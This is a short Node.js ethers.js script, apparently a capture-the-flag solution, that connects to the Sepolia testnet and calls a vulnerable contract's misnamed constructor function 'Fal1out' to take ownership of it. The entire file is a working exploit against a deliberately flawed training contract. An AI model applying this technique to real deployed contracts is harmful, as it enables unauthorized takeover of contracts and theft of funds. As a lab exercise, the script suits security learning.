const { ethers } = require("ethers");
const abi = require("../../artifacts/contracts/2-fallout/Fallout.sol/Fallout.json").abi;
require("dotenv").config();

const FALLOUT_ADDRESS = "";

falloutAttack = async () => {
    const provider = new ethers.JsonRpcProvider(`https://eth-sepolia.g.alchemy.com/v2/${process.env.ALCHEMY_KEY}`);
    const wallet = new ethers.Wallet(process.env.METAMASK_KEY, provider);
    const falloutContract = new ethers.Contract(FALLOUT_ADDRESS, abi, wallet);
    const tx = await falloutContract.Fal1out({
        gasLimit: 3000000,
        gasPrice: ethers.parseUnits("5", "gwei")
    });
    await tx.wait()
};

falloutAttack();